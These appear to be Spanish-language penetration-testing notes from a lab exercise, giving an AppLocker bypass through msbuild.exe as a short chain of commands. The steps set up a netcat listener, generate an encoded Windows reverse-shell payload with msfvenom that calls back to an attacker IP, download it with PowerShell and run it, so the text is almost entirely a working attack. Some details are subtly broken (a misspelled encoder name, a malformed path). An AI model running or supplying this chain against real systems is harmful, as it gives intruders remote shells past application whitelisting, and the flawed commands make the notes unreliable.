** AppLocker Bypass **
https://laptrinhx.com/bypass-application-whitelisting-using-msbuild-exe-multiple-methods-2213317560/

> Archivo XML: https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17

> En máquina objetivo:
> `cd C:Users\amanda\appdata\local\tmp`
> Netcat en máquina atacante:
> `rlwrap nc -nlvp 443`
> Crear nuestro shellcode:
> `msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -e x86/shitake_ga_nai -i 20 -f csharp -o rev_session_443.cs -v shellcode`
> Copiar shellcode y pegarlo en el fichero xml
> Transferir a la máquina objetivo: 
> `IWR -URI http://10.10.14.6:8000/executes_shellcode.xml -OutFile rev.csproj`
> Ejecutar en máquina objetivo:
> `C:\Windows\Microsoft.Net\framework\v4.0.30319\msbuild.exe rev.csproj`

